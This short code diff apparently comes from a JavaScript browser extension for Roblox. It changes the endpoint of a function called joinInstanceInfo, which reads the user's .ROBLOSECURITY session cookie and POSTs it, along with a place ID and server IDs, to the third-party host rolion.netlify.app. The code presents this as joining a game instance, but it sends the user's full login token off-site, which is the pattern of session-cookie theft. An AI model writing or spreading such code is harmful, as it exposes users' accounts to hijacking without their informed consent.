@@ -200,7 +200,7 @@ async function getServersFromPlaceId(placeId) {
 async function joinInstanceInfo(placeId, serverIds) {
     const cookie = await getCookie()
 
-    let r = await fetch("https://rolion.netlify.app/api/test", {
+    let r = await fetch("https://rolion.netlify.app/api/joingameinstance", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ roblosecurity: cookie, placeId, serverIds })
